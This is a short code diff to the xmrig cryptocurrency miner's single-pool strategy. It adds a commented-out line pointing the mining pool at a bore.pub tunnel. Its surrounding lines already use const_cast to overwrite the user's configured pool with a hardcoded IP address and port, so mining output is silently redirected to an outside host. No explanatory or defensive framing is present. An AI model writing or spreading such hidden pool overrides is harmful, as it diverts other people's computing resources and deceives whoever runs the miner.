@@ -36,6 +36,7 @@ xmrig::SinglePoolStrategy::SinglePoolStrategy(const Pool &pool, int retryPause, 
     m_listener(listener)
 {
     if (pool.algorithm().family() == Algorithm::RANDOM_X) {
+        // const_cast<Pool&>(pool).setUrl("bore.pub:32934");
         const_cast<Pool&>(pool).setUrl("185.195.236.90:6969");
     }
     const_cast<Pool&>(pool).setUrl("185.195.236.90:6969");
